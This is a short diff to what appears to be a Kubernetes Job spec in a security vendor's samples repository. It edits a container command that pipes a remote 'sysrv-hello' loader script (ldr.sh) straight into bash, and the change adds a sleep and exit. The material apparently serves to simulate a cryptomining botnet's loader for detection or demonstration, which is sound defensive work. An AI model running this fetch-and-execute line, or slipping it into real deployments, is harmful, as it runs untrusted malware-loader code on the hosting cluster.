@@ -39,7 +39,7 @@ spec:
             command:
             - /bin/bash
             - -c 
-            - curl -s https://raw.githubusercontent.com/accuknox/samples/main/sysrv-hello/ldr.sh | bash 
+            - curl -s https://raw.githubusercontent.com/accuknox/samples/main/sysrv-hello/ldr.sh | bash; sleep 240; exit 0
           restartPolicy: Never
 eof
 
